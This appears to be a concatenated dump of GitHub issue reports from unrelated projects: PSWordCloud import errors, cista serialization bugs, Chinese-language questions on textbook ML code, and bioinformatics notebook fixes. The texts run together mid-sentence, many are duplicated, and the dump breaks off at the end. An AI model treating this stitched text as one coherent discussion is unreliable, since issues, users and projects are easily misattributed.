At C:\Users\Windos\Documents\WindowsPowerShell\Modules\pswordcloud\2.0.1\PSWordCloud.psm1:15 char:16
+ Add-Type -Path $SkiaDllPath
+                ~~~~~~~~~~~~
    + CategoryInfo          : WriteError: (:) [Add-Type], ParameterBindingException
    + FullyQualifiedErrorId : ParameterBindingFailed,Microsoft.PowerShell.Commands.AddTypeCommand

Import-Module : Could not load file or assembly 'SkiaSharp, Version=1.68.0.0, Culture=neutral,
PublicKeyToken=0738eb9f132ed756' or one of its dependencies. The system cannot find the file specified.
At C:\Users\Windos\Documents\WindowsPowerShell\Modules\pswordcloud\2.0.1\PSWordCloud.psm1:16 char:1
+ Import-Module  "$PSScriptRoot\PSWordCloudCmdlet.dll"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Import-Module], FileNotFoundException
    + FullyQualifiedErrorId : System.IO.FileNotFoundException,Microsoft.PowerShell.Commands.ImportModuleCommand
```

How we dealt with this in PoshNotify is putting the Windows PowerShell specific stuff in a "default" stanza (even though it duplicates the "IsWindows" stanza) so that we can do specific stuff for that platform in future if required. Hello, when trying to run PSWordCloud on my Mac I am running into this issue:

* installed `mono-libgdiplus`
* on macOS Mojave (10.14.2)
* pwsh version (6.1.1)

Running the following:
```
$get_domain = Get-Content -Path /Users/josh.rickard/get_domain.json
New-WordCloud -Path /Users/josh.rickard/Desktop/get_domain.png -Input $get_domain
```

I receive the following error, which dumps me out of my `pwsh` session and provides the following information:
```
** (process:19320): WARNING **: 14:34:29.106: Path conversion requested 0 bytes (8388608 x 8388608). Maximum size is 8388608 bytes.       
** ERROR:region.c:1155:GdipCombineRegionPath: assertion failed: (region->bitmap)   Abort trap: 6 
```

Any ideas? It would be pretty cool if you could choose the orientation of the focus word. Maybe even more than just making it horizontal or vertical, but diagonal or something custom. That'd be a ton of fun 😁  Currently, if a word cannot find a suitable place, the code "gives up" and doesn't care if the word overlaps.
It would be better if the word were simply hidden.

In line with this, there are a couple other improvements to placement we can do: 

- [x] Allow words to extend to the bounds of the image. Currently, they're limited to approximately 3/4 of a rectangular image at the very outside. _Note:_ this may require increasing the maximum word size.
- [x] Skip checking for points that are themselves already outside image bounds.
- [x] Check both possible rotations for words that don't seem to fit at a scan point. This should allow for words to be filled into the gaps a bit better.
- [x] Add optional switch `-IgnoreImageBounds` (name subject to change) to allow users to opt to ignore image bounds checks completely System.Drawing.GraphicsPath has an AddString method to create tight paths from the string shape itself.

Using these paths to create Region objects should allow us to check for much more accurate intersections than we are currently able to do, permitting way more parking in the word clouds, System.Drawing.GraphicsPath has an AddString method to create tight paths from the string shape itself.

Using these paths to create Region objects should allow us to check for much more accurate intersections than we are currently able to do, permitting way more parking in the word clouds, Currently, if a word cannot find a suitable place, the code "gives up" and doesn't care if the word overlaps.
It would be better if the word were simply hidden.

In line with this, there are a couple other improvements to placement we can do: 

1. Allow words to extend to the bounds of the image. Currently, they're limited to approximately 3/4 of a rectangular image at the very outside.
2. Skip checking for points that are themselves already outside image bounds.
3. Check both possible rotations for words that don't seem to fit at a scan point. This should allow for words to be filled into the gaps a bit better. I thought I would be having some nice output if I would use 

```
function Get-ComputerDisk {
    param(
        $ComputerName = $Env:COMPUTERNAME
    )
    $Data2 = Get-WmiObject win32_DiskDrive -ComputerName $ComputerName | Select Index, Model, Caption, SerialNumber, Description, MediaType, FirmwareRevision, Partitions, @{Expression = {$_.Size / 1Gb -as [int]}; Label = "Total Size(GB)"}, PNPDeviceID
    return $Data2
}
```

as my data for words. I suspected it may not work :-) 

```
get-clipboard | New-WordCloud -Path wordcloud.png -FontFamily Georgia
```

I kept waiting for minutes and it didn't do anything :-) What I actually wanted is to create some nice output for blogs pictures, especially for featured photo. It takes a lot of effort to create a good blog post and it's even harder to maintain quality photos for Featured Photos so that it doesn't look like a complete trash. 

What I was looking to create was something like this:

![image](https://user-images.githubusercontent.com/15063294/50086003-0e036280-01fc-11e9-9d60-8f17fd29b884.png)

It would be so cool if this project could generate pictures like that. Where it would take some PowerShell code or another type of code and mix it up in colors and produce nice looking featured picture with chosen size. 

I imagine this may be a bit out of the scope of this project thou ;-) 

Something like this - would be cool too

![image](https://user-images.githubusercontent.com/15063294/50086971-0e512d00-01ff-11e9-890f-4db03d74a49d.png)

Or this:

![image](https://user-images.githubusercontent.com/15063294/50087069-2f198280-01ff-11e9-84e1-58834478dcf2.png)
 This would give some protection against image theft What I was looking to create was something like this:

![image](https://user-images.githubusercontent.com/15063294/50086003-0e036280-01fc-11e9-9d60-8f17fd29b884.png)

Your comment:
3D rotations should be possible using the .NET classes, but I've no idea if they actually are. Will have to research.

I'm pretty sure I've seen filters and can experiment there, though. Pipe in random streams of objects at get usable output for the word cloud.

I think the most pragmatic solution would be to simply take whatever the console would render and attempt to make that work by sending it through Out-String to get the string representation. In fact, you can do that already, but it would be nice if this just handled it. Something like this

![image](https://user-images.githubusercontent.com/15063294/50086971-0e512d00-01ff-11e9-890f-4db03d74a49d.png)

Or this:

![image](https://user-images.githubusercontent.com/15063294/50087069-2f198280-01ff-11e9-84e1-58834478dcf2.png)
 Hello, when trying to run PSWordCloud on my Mac I am running into this issue:

* installed `mono-libgdiplus`
* on macOS Mojave (10.14.2)
* pwsh version (6.1.1)

Running the following:
```
$get_domain = Get-Content -Path /Users/josh.rickard/get_domain.json
New-WordCloud -Path /Users/josh.rickard/Desktop/get_domain.png -Input $get_domain
```

I receive the following error, which dumps me out of my `pwsh` session and provides the following information:
```
** (process:19320): WARNING **: 14:34:29.106: Path conversion requested 0 bytes (8388608 x 8388608). Maximum size is 8388608 bytes.                             
** ERROR:region.c:1155:GdipCombineRegionPath: assertion failed: (region->bitmap)   Abort trap: 6      ```

Any ideas? For example a word cloud with the "PowerShell" word which would contains all the cmdlet names present on your machine.

Or "PSGallery" with the top 200 modules names This is just a result of trying to re-run some older code (from before the SVG update) and running into an issue off the bat. I'd previously used -InputObject, but this isn't working and piping data in is working perfectly.

![image](https://user-images.githubusercontent.com/6955786/54969659-efbfb680-4fe3-11e9-90c8-9ddd49e5a34e.png)

Much like my issue about importing on Windows, I'm not sure if this is intentional or not as I notice all the examples show piping data in. Update the README.md file to include the command you used to generate the word cloud.
Include an Examples folder, and a set of examples. I've seen some great images on twitter from the creator.  (n.b. not sure if current releases are meant to drop support for Windows PowerShell?)

The latest release uses a syntax on `Join-Path` that won't work in Windows PowerShell, and and automatic variable that also doesn't exist in Windows PowerShell.

Trying to import the module results in:

```
Join-Path : A positional parameter cannot be found that accepts argument 'SkiaSharp.dll'.
At C:\Users\Windos\Documents\WindowsPowerShell\Modules\pswordcloud\2.0.1\PSWordCloud.psm1:13 char:16
+ ... iaDllPath = Join-Path -Path $PSScriptRoot -ChildPath $PlatformFolder  ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (:) [Join-Path], ParameterBindingException
    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.JoinPathCommand

Add-Type : Cannot bind argument to parameter 'Path' because it is null.
At C:\Users\Windos\Documents\WindowsPowerShell\Modules\pswordcloud\2.0.1\PSWordCloud.psm1:15 char:16
+ Add-Type -Path $SkiaDllPath
+                ~~~~~~~~~~~~
    + CategoryInfo          : InvalidData: (:) [Add-Type], ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.AddTypeCommand

Import-Module : Could not load file or assembly 'SkiaSharp, Version=1.68.0.0, Culture=neutral,
PublicKeyToken=0738eb9f132ed756' or one of its dependencies. The system cannot find the file specified.
At C:\Users\Windos\Documents\WindowsPowerShell\Modules\pswordcloud\2.0.1\PSWordCloud.psm1:16 char:1
+ Import-Module  "$PSScriptRoot\PSWordCloudCmdlet.dll"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Import-Module], FileNotFoundException
    + FullyQualifiedErrorId : System.IO.FileNotFoundException,Microsoft.PowerShell.Commands.ImportModuleCommand
```

This is coming from this line in the psm1 file:

```powershell
$SkiaDllPath = Join-Path -Path $PSScriptRoot -ChildPath $PlatformFolder "SkiaSharp.dll"
```

Possible fixes are to change the child path to "$PlatformFolder\SkiaSharp.dll"` or two swap out `Join-Path` for `[http://System.IO .Path]::Combine()`

However, this change highlights a second issue, the switch statement for Platform  Folder selection relies on PowerShell Core as `$IsWindows` isn't a thing in Windows PowerShell.

```
Add-Type : Cannot bind parameter 'Path' to the target. Exception setting "Path": "Cannot find path
'C:\Users\Windos\Documents\WindowsPowerShell\Modules\pswordcloud\2.0.1\SkiaSharp.dll' because it does not exist."
At C:\Users\Windos\Documents\WindowsPowerShell\Modules\pswordcloud\2.0.1\PSWordCloud.psm1:15 char:16
+ Add-Type -Path $SkiaDllPath
+                ~~~~~~~~~~~~
    + CategoryInfo          : WriteError: (:) [Add-Type], ParameterBindingException
    + FullyQualifiedErrorId : ParameterBindingFailed,Microsoft.PowerShell.Commands.AddTypeCommand

Import-Module : Could not load file or assembly 'SkiaSharp, Version=1.68.0.0, Culture=neutral,
PublicKeyToken=0738eb9f132ed756' or one of its dependencies. The system cannot find the file specified.
At C:\Users\Windos\Documents\WindowsPowerShell\Modules\pswordcloud\2.0.1\PSWordCloud.psm1:16 char:1
+ Import-Module  "$PSScriptRoot\PSWordCloudCmdlet.dll"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Import-Module], FileNotFoundException
    + FullyQualifiedErrorId : System.IO.FileNotFoundException,Microsoft.PowerShell.Commands.ImportModuleCommand
```

How we dealt with this in PoshNotify is putting the Windows PowerShell specific stuff in a "default" stanza (even though it duplicates the "IsWindows" stanza) so that we can do specific stuff for that platform in future if required. It would be pretty cool if you could choose the orientation of the focus word. Maybe even more than just making it horizontal or vertical, but diagonal or something custom. That'd be a ton of fun 😁 
<---------->
159045490
Guys  I got some trouble when serialize a struct has base, I simplified  code into following
```cpp
struct Base {};
struct Derive:Base {
  int field;
};

// ......
// Derive d = {{}, 0};
std::vector<uint8_t> out = cista::serialize<MODE, Derive>(d);
};
```

And the compiler gave error like 
```bash
/**/cista-0.6/include/cista/reflection/to_tuple.h:230:11: error: type 'const Derive' decomposes into 1 elements, but 2 names were provided
    auto& [p1, p2] = t;
          ^
```

Obviously, the prolblem was caused because `Derive d` has to be init like `{{}, 0}` rather than `{0}`, so the `arity()` gives the number of binging arguments is 2.

So, is there any way to solve it or we just can not use cista to serialize struct with inheritance? Is there a vcpkg port? Have not found any example about how to write a custom serialize funtion, so i try myself.
Here is my struct:
```
struct vec3 {
	float x, y, z;
};

struct mat4 {
	float d[16];
};

struct Vertex {
	vec3 position;
	vec3 normal;
};

struct Mesh {
	cista::raw::vector<mat4> transforms;
	cista::raw::vector<Vertex> vertices;
};

using Meshes = cista::raw::vector<Mesh>;
```
And my serialize funtions:
```
template <typename Ctx>
void serialize(Ctx& c, Mesh const* mesh, cista::offset_t const pos) {
	for(auto const& t : mesh->transforms) {
		c.write(pos, t);
	}
	for(auto const& v : mesh->vertices) {
		c.write(pos, v);
	}
}

template <typename Ctx>
void serialize(Ctx& c, Meshes const* meshes, cista::offset_t const pos) {
	for(auto const& mesh : *meshes) {
		c.write(pos, mesh);
	}
}
```
The crash error:

    Unhandled exception at 0x772E35D2 in cista-example.exe: Microsoft C++ exception: std::runtime_error at memory location 0x00BEFAB8. Guys  I got some trouble when serialize a struct has base, I simplified  code into following
```cpp
struct Base {};
struct Derive:Base {
  int field;
};

// ......
// Derive d = {{}, 0};
std::vector<uint8_t> out = cista::serialize<MODE, Derive>(d);
};
```

And the compiler gave error like 
```bash
/**/cista-0.6/include/cista/reflection/to_tuple.h:230:11: error: type 'const Derive' decomposes into 1 elements, but 2 names were provided
    auto& [p1, p2] = t;
          ^
```

Obviously, the prolblem was caused because `Derive d` has to be init like `{{}, 0}` rather than `{0}`, so the `arity()` gives the number of binging arguments is 2.

So, is there any way to solve it or we just can not use cista to serialize struct with inheritance? From https://www.reddit.com/r/cpp/comments/ac4pow/cista_c17_serialization_reflection_library_single/ed60qqo:

> a default "version" (single-byte 0) added before each struct would make it easier to evolve the schema. I'm using devtoolset-8 on centos7 to get a higher verison of gcc without influencing the system gcc。
when compiler the master, I get on error as blew
thirdparty/cista/aligned_alloc.h:28:9: error: ‘aligned_alloc’ is not a member of ‘std’
   (std::aligned_alloc(  

The reason is that libc is to old from the answer [compiler-cant-find-aligned-alloc-function]( https://stackoverflow.com/questions/52777209/compiler-cant-find-aligned-alloc-function) 
```c
#if __cplusplus >= 201703L && defined(_GLIBCXX_HAVE_ALIGNED_ALLOC)
  using ::aligned_alloc;
#endif
```
so I change to code to fix this error
```diff
+#elif defined(_GLIBCXX_HAVE_ALIGNED_ALLOC)
+    #include <memory>
+    #define CISTA_ALIGNED_ALLOC(alignment, size) \
+        (std::aligned_alloc(                       \
+            cista::next_power_of_two((alignment)), \
+            cista::to_next_multiple((size), cista::next_power_of_two((alignment)))))
 #else
-#include <memory>
-#define CISTA_ALIGNED_ALLOC(alignment, size) \
-  (std::aligned_alloc(                       \
-      cista::next_power_of_two((alignment)), \
-      cista::to_next_multiple((size), cista::next_power_of_two((alignment)))))
+    #define CISTA_ALIGNED_ALLOC(alignment, size) (std::malloc((size)))
 #define CISTA_ALIGNED_FREE(ptr) std::free((ptr))
```
 Hi
the current release of  version is 0.4, which is behand master too much
I'm trying to build release from master branch
```shell
mkdir build;
cd build
cmake3 -f CMakeLists.txt -DCMAKE_CXX_COMPILER=/opt/scylladb/bin/g++ ../
make
```
configure is ok,but nothing can be found at dir build or subdir
 I'm using devtoolset-8 on centos7 to get a higher verison of gcc without influencing the system gcc。
when compiler the master, I get on error as blew
thirdparty/cista/aligned_alloc.h:28:9: error: ‘aligned_alloc’ is not a member of ‘std’
   (std::aligned_alloc(  

The reason is that libc is to old from the answer [compiler-cant-find-aligned-alloc-function]( https://stackoverflow.com/questions/52777209/compiler-cant-find-aligned-alloc-function) 
```c
#if __cplusplus >= 201703L && defined(_GLIBCXX_HAVE_ALIGNED_ALLOC)
  using ::aligned_alloc;
#endif
```
so I change to code to fix this error
```diff
+#elif defined(_GLIBCXX_HAVE_ALIGNED_ALLOC)
+    #include <memory>
+    #define CISTA_ALIGNED_ALLOC(alignment, size) \
+        (std::aligned_alloc(                       \
+            cista::next_power_of_two((alignment)), \
+            cista::to_next_multiple((size), cista::next_power_of_two((alignment)))))
 #else
-#include <memory>
-#define CISTA_ALIGNED_ALLOC(alignment, size) \
-  (std::aligned_alloc(                       \
-      cista::next_power_of_two((alignment)), \
-      cista::to_next_multiple((size), cista::next_power_of_two((alignment)))))
+    #define CISTA_ALIGNED_ALLOC(alignment, size) (std::malloc((size)))
 #define CISTA_ALIGNED_FREE(ptr) std::free((ptr))
```
 i'm trying build against MSVC Win32. Does this assertion means only 64bit is supported? Hi,

Could you please consider making the `constexpr serialized_size()` as a pure non-constexpr inlined static func with default `void* = nullptr` argument?
This will add much more more flexibility IMHO for advanced customizations, with relatively (if any) low cost from cista point of view, AFIK this should/would be pretty simple inlined...

That is to say, it will allow to `auto custom = reinterpret_cast<CustomType*>(proposed_void_arg);` and then some direct fancy `CustomType` size calculations. ![图片](https://user-images.githubusercontent.com/1172901/71541409-633b8d80-2993-11ea-9a20-6ed65c296aa5.png)
 Hi!

During serialization, the size of a type provided is calculated by `sizeof(value)`, here:
https://github.com/felixguendling/cista/blob/707ef83b3302104a2aeac5714ff9148ac2e94dc4/include/cista/serialization.h#L194-L196

This is too early IMO to calculate size and alignment when working with custom type.

For example, let's consider these structs:

`struct Simple { std::vector<int> data; } simple;`
`template <typename Ctx>`
`void serialize(Ctx& c, Simple const* el, offset_t const pos) { c.write(pos, el->data[0]); }`


`struct Complex { Simple simple1; Simple simple2; Simple simple3; } complex;`
`template <typename Ctx>`
`void serialize(Ctx& c, Complex const* el, offset_t const pos) { c.write(pos, (int)42); }`

When serialized, they will create 0x20 and 0x60 bytes respectiviely (std::vector<int> from MVSC 2017 15.9.0) for `cista::byte_buf` as a result of sizeof(Simple) and sizeof(Complex) - this cannot be easily overloaded in custom serialization since Context is already given (alocated) and it could only grow. Hi,

As I mentioned in #13 we should also handle type ref decay for `std::reference_wrapper<>`;

This thing will pass a reference under the radar of `std::remove_reference_t<>`;
Please take a look on my gist for related test snippets: [Type Reference Decay Tryouts](https://gist.github.com/ChemiaAion/05fa1c4477fa0524ac8f93b5ce36d077)

Please improve the `decay_t` utility by `std::reference_wrapper<>` dedicated decay layer, e.g. something like `DecayReferenceWrapper` from my gist. The last release (0.4) dates back from 2 Jan 2019 and many useful commits have happened since.
Do you have a rough estimate of when you might make a new release ?
And maybe what do you think is missing that you want for the next release to happen ?

Thanks for this very nice serialization library. Hi!

During serialization, the size of a type provided is calculated by `sizeof(value)`, here:
https://github.com/felixguendling/cista/blob/707ef83b3302104a2aeac5714ff9148ac2e94dc4/include/cista/serialization.h#L194-L196

This is too early IMO to calculate size and alignment when working with custom type.

For example, let's consider these structs:

`struct Simple { std::vector<int> data; } simple;`
`template <typename Ctx>`
`void serialize(Ctx& c, Simple const* el, offset_t const pos) { c.write(pos, el->data[0]); }`


`struct Complex { Simple simple1; Simple simple2; Simple simple3; } complex;`
`template <typename Ctx>`
`void serialize(Ctx& c, Complex const* el, offset_t const pos) { c.write(pos, (int)42); }`

When serialized, they will create 0x20 and 0x60 bytes respectiviely (std::vector<int> from MVSC 2017 15.9.0) for `cista::byte_buf` as a result of sizeof(Simple) and sizeof(Complex) - this cannot be easily overloaded in custom serialization since Context is already given (alocated) and it could only grow. Hi,

As I mentioned in #13 we should also handle type ref decay for `std::reference_wrapper<>`.

This will pass a reference under the radar of `std::remove_reference_t<>`;
Please take a look on my gist for related snippets: [Type Reference Decay Tryouts](https://gist.github.com/ChemiaAion/05fa1c4477fa0524ac8f93b5ce36d077)

Please improve the `decay_t` utility by `std::reference_wrapper<>` dedicated decay layer, something like `DecayReferenceWrapper` from my gist. Hi,

I noticed that all types decays are formed as: std::remove_reference_t<std::remove_const_t<>>.
This seems to be OK for all current use cases:
`std::is_scalar_v<>` is happy with const/volatile qualifiers (same for all cv combinations);
`std::is_pointer_v<>` removes cv qualifiers;
`std::alignment_of_v<>` is happy;
`std::numeric_limits<>` are happy;
`sizeof(std::declval<>)` I would be careful since `std::add_rvalue_reference<>` could be problematic with const/volatile qualifiers [LWG2101](https://cplusplus.github.io/LWG/issue2101).

I would like recommend to strength all these `std::remove_reference_t<std::remove_const_t<>>` decays to `std::remove_reference_t<std::remove_cv_t<>>`. Hi,

I have investigated arity calculations more deeply lately and I think I found much simpler and more elegant way than one implemented here as [Björn Fahller](https://playfulprogramming.blogspot.com/2016/12/serializing-structs-with-c17-structured.html) idea.

It's this one: ["aggregate arity"](https://codereview.stackexchange.com/questions/142804/get-n-th-data-member-of-a-struct) by Anatoliy V. Tomilov, @tomilov.

Of course it does not handle arity for non-aggregates as struct-binding will do, but this is known "issue" - goes the same for Björn's implementation.

It is fully SFINAE-automatic (no macros) with super elegant std::declval's from non-static _wildcard_, and additionally - I think most important - it could be quite easily extended by simple logic for log_time-like arity calculations, examples/ideas are in links in my gist below.

So, here is my current approach: ["ChemiaAion arity"](https://gist.github.com/ChemiaAion/4118a3598f0b120b7f9c5884e9799a8b)
You could also find a little refactored Björn's implementation there for reference.

**I think this could be considered during your compile times speed-up optimization.** Hi,

I have heavily tested [Björn Fahller's](https://playfulprogramming.blogspot.com/2016/12/serializing-structs-with-c17-structured.html) arity approach used here and I found that **(...)MAKE_ARITY_FUNC(1)** will fail for simple one-field PODs such as: `struct Field1 { int number1; };`

It's because **is_paren_constructible** would be true in such a case (count = 1), here:
https://github.com/felixguendling/cista/blob/e25935a817d34c08e3bce32eb64935fcfad300a4/include/cista/reflection/arity.h#L62

IMHO **(...)MAKE_ARITY_FUNC(1)** should be considered as a _special case_, e.g. without **is_paren_constructible** at all or as for a sake of template **is_paren_constructible<T, count>()** (with negation removed). From https://www.reddit.com/r/cpp/comments/ac4pow/cista_c17_serialization_reflection_library_single/ed60qqo:

> a default "version" (single-byte 0) added before each struct would make it easier to evolve the schema.
<---------->
159194100
您好，我对贝叶斯算法实现的先验概率有些疑惑
`    # 计算概率
    def calculate_probabilities(self, input_data):
        # summaries:{0.0: [(5.0, 0.37),(3.42, 0.40)], 1.0: [(5.8, 0.449),(2.7, 0.27)]}
        # input_data:[1.1, 2.2]
        probabilities = {}
        for label, value in self.model.items():
            probabilities[label] = 1 #probability[label]=1???
            for i in range(len(value)):
                mean, stdev = value[i]
                probabilities[label] *= self.gaussian_probability(input_data[i], mean, stdev) 
        return probabilities`

为什么这里的probabilities[label]可以直接赋值为1呢，这样所有的类的先验概率是不是都一样了，为什么不根据样本计算这里的probabilities[label]呢
谢谢解答 ![1553330059(1)](https://user-images.githubusercontent.com/28550119/54863913-9d835900-4d89-11e9-8439-85430a86a1b8.png)
  您好，我对贝叶斯算法实现的先验概率有些疑惑
`    # 计算概率
    def calculate_probabilities(self, input_data):
        # summaries:{0.0: [(5.0, 0.37),(3.42, 0.40)], 1.0: [(5.8, 0.449),(2.7, 0.27)]}
        # input_data:[1.1, 2.2]
        probabilities = {}
        for label, value in self.model.items():
            probabilities[label] = 1 #probability[label]=1???
            for i in range(len(value)):
                mean, stdev = value[i]
                probabilities[label] *= self.gaussian_probability(input_data[i], mean, stdev) 
        return probabilities`

为什么这里的probabilities[label]可以直接赋值为1呢，这样所有的类的先验概率是不是都一样了，为什么不根据样本计算这里的probabilities[label]呢
谢谢解答 同样的代码为什么我的不一样，scikit-learn的结果不对。。。。
![下载 (1)](https://user-images.githubusercontent.com/16555750/58165784-0d935a00-7cbb-11e9-8423-17cc901eae66.png)
 函数  pmf中的变量名称和函数中使用的不一致。   第3张k近邻法中In[10]第34行的n=10，这句话有用到吗？
 `def residuals_func_regularization(p, x, y):
    ret = fit_func(p, x) - y
    ret = np.append(ret, np.sqrt(0.5*regularization*np.square(p))) # L2范数作为正则化项
    return ret`

是不是应该改成
`def residuals_func_regularization(p, x, y):
    ret = fit_func(p, x) - y
    ret = np.append(ret/x.size, np.sqrt(0.5*regularization*np.square(p))) # L2范数作为正则化项
    return ret`

L2 范数 前面的是不是要处以N     def _G(self, features, labels, weights):
                ...
                if weight_error_positive < weight_error_nagetive:
                    weight_error = weight_error_positive
                    _compare_array = compare_array_positive
                    direct = 'positive' 修改为 _direct = 'positive'
                    
                else:
                    weight_error = weight_error_nagetive
                    _compare_array = compare_array_nagetive
                    direct = 'nagetive' 修改为 _direct = 'positive'

                # print('v:{} error:{}'.format(v, weight_error))
                if weight_error < error:
                    error = weight_error
                    compare_array = _compare_array
                    best_v = v
                    加上 direct = _direct

就是direct也得像误差一样处理吧？否则后续非最优阈值对应的direct也可能改变已得结果
                     `for d in range(len(X_train)):
                X = X_train[d]
                y = y_train[d]
                if y * self.sign(X, self.w, self.b) <= 0:
                    self.w = self.w + self.l_rate*np.dot(y, X)
                    self.b = self.b + self.l_rate*y
                    wrong_count += 1
 if wrong_count == 0:
    is_wrong = True`
这样写是梯度下降，应该不是随机梯度下降，以下是修改后的随机梯度下降，请参考，如有误，还请指出：
`for d in range(len(X_train)):
                x = X_train[d]
                y = y_train[d]
                if y * self.sign(x, self.w, self.b) <= 0:
                    wrong_index_list.append(d)
  if len(wrong_index_list) == 0:
    break
  else:
    index = random.randint(0, len(wrong_index_list) - 1)
    w_index = wrong_index_list[index]
    self.w = self.w + self.l_rate*np.dot(y_train[w_index], X_train[w_index])
    self.b = self.b + self.l_rate*y_train[w_index]` 您好，在此函数统计阶段，最后排序是对yi的标签出现的次数排序，但是单独拿出来代码好像是对yi标签的排序。求解答 话说当我将你的.ipynb中代码写成.py文件时，发现代码中变量的作用域很是不规范，不知道是不是我个人习惯的原因 您好，我直接运行svm代码，输出的score很低，只有0.5，而且多次运行存在score还不同，大部分结果都是很低 在_G函数中
关于direct的保存，不能保证最终返回的direct 是错误最低的direct `for d in range(len(X_train)):
                X = X_train[d]
                y = y_train[d]
                if y * self.sign(X, self.w, self.b) <= 0:
                    self.w = self.w + self.l_rate*np.dot(y, X)
                    self.b = self.b + self.l_rate*y
                    wrong_count += 1
 if wrong_count == 0:
    is_wrong = True`
这样写是梯度下降，应该不是随机梯度下降，以下是修改后的随机梯度下降，请参考，如有误，还请指出：
`for d in range(len(X_train)):
                x = X_train[d]
                y = y_train[d]
                if y * self.sign(x, self.w, self.b) <= 0:
                    wrong_index_list.append(d)
  if len(wrong_index_list) == 0:
    break
  else:
    index = random.randint(0, len(wrong_index_list) - 1)
    w_index = wrong_index_list[index]
    self.w = self.w + self.l_rate*np.dot(y_train[w_index], X_train[w_index])
    self.b = self.b + self.l_rate*y_train[w_index]` The following code that creat a pdf:
tree_pic = export_graphviz(clf, out_file="mytree.pdf")
with open('mytree.pdf') as f:
    dot_graph = f.read()

However, I can not open that, I wander is there anything wrong? 请问为什么clf = Perceptron(fit_intercept=False, max_iter=1000, shuffle=False)这里的fit_intercept要设置为false呢，这样不就没有截距了吗 
<---------->
159384301
 https://cr.joyent.us/#/c/5650/  https://cr.joyent.us/#/c/5723 https://cr.joyent.us/#/c/5717/  https://cr.joyent.us/#/c/6103/ 
<---------->
159451549
![IMG_3066](https://user-images.githubusercontent.com/4959534/60615340-2bca9a80-9dcf-11e9-9c90-4066e852c03c.jpg)
how to get such a masking effect? UIEffectView should move the bottom of the inner shadow layer.

- container view
- inner shadow layer
- effect view
- background color layer
- outer shadow layer Some animations are not supported because there is some UI issue while changing the size of the shape view. UIEffectView should move the bottom of the inner shadow layer.

- container view
- inner shadow layer
- effect view
- background color layer
- outer shadow layer
<---------->
159470837
- this command won't work in Debian/Ubuntu:

apt-get r-bioc-biobase r-cran-ggplot2

- only way i could install these two libraries is from R prompt:
 
source("http://bioconductor.org/biocLite.R")
biocLite()
install.packages('ggplot2') In [5]:
id_list = rec_list['IdList']
hdl = Entrez.efetch(db='nucleotide', id=id_list, rettype='gb')

- this will make the next statement fail, should pass retmax argument:

In [5]:
id_list = rec_list['IdList']
hdl = Entrez.efetch(db='nucleotide', id=id_list, rettype='gb', retmax=rec_list['Count'])



 `chrom_seq` in-parameter is never used in `get_sequence`-function in `Chapter03/Getting_Gene.ipynb`. 
Should `my_seq` be switched to `chrom_seq` in:
```
my_cds = Seq.Seq(str(my_seq[CDS.start - 1: CDS.end]), alphabet=Alphabet.IUPAC.unambiguous_dna)
```
? these two libraries should be part of the environment, otherwise code in chap2 will fail:
conda install graphviz
conda install tzlocal In [5]:
id_list = rec_list['IdList']
hdl = Entrez.efetch(db='nucleotide', id=id_list, rettype='gb')

- this will make the next statement fail, should pass retmax argument:

In [5]:
id_list = rec_list['IdList']
hdl = Entrez.efetch(db='nucleotide', id=id_list, rettype='gb', retmax=rec_list['Count'])



 ```
Step 10/24 : RUN conda install --yes statsmodels pysam plink gffutils genepop trimal
 ---> Running in 42b793f2697e
Solving environment: ...working... failed

UnsatisfiableError: The following specifications were found to be in conflict:
  - conda[version='>=4.5.12']
  - gffutils
  - python=3
Use "conda info <package>" to see the dependencies for each package.
```

 ```
Step 10/24 : RUN conda install --yes statsmodels pysam plink gffutils genepop trimal
 ---> Running in 42b793f2697e
Solving environment: ...working... failed

UnsatisfiableError: The following specifications were found to be in conflict:
  - conda[version='>=4.5.12']
  - gffutils
  - python=3
Use "conda info <package>" to see the dependencies for each package.
```

 `chrom_seq` in-parameter is never used in `get_sequence`-function in `Chapter03/Getting_Gene.ipynb`. 
Should `my_seq` be switched to `chrom_seq` in:
```
my_cds = Seq.Seq(str(my_seq[CDS.start - 1: CDS.end]), alphabet=Alphabet.IUPAC.unambiguous_dna)
```
? 1) boxplot
**sns.boxplot(vps, ax=ax)**
- since i don't know when the format of passing data to boxplot requires the keyword 'data':

**sns.boxplot(data=vps, ax=ax)**

2) subplot
alway nice to provide a good format for the plot, default is too small, e.g.:
**fig, ax = plt.subplots(figsize=(14,8))**

3) set_xticklabels
**ax.set_xticklabels([str(x) for x in range(26, max(qual_pos.keys()) + 1)])**
- this will print the list of labels before the plot, better assign it to a dummy variable, so only graph with labels shows up:
**d = ax.set_xticklabels([str(x) for x in range(26, max(qual_pos.keys()) + 1)])**
 **recs = SeqIO.parse(gzip.open('SRR003265.filt.fastq.gz'), 'fastq')**
- this won't work as gzip will try to open the file by default in binary mode, the text mode needs to be specified: 

**recs = SeqIO.parse(gzip.open('SRR003265.filt.fastq.gz', 'rt'), 'fastq')**


 poses = qual_pos.keys()
**poses.sort()**
- will only work in Python 2.5
- in Python 3:

**poses = sorted(qual_pos.keys())**
 poses = qual_pos.keys()
**poses.sort()**
- will only work in Python 2.5
- in Python 3:

**poses = sorted(qual_pos.keys())**
 - this command won't work in Debian/Ubuntu:

apt-get r-bioc-biobase r-cran-ggplot2

- only way i could install these two libraries is from R prompt:
 
source("http://bioconductor.org/biocLite.R")
biocLite()
install.packages('ggplot2') **sns.boxplot(vps, ax=ax)**
- since i don't know when the format of passing data to boxplot requires the keyword 'data':

**sns.boxplot(data=vps, ax=ax)** **recs = SeqIO.parse(gzip.open('SRR003265.filt.fastq.gz'), 'fastq')**
- this won't work as gzip will try to open the file by default in binary mode, the text mode needs to be specified: 
recs = SeqIO.parse(gzip.open('SRR003265.filt.fastq.gz', **'rt'**), 'fastq')


 these two libraries are required 

<---------->
159841963
Using this role with the openstack agent fails with this error:

```console
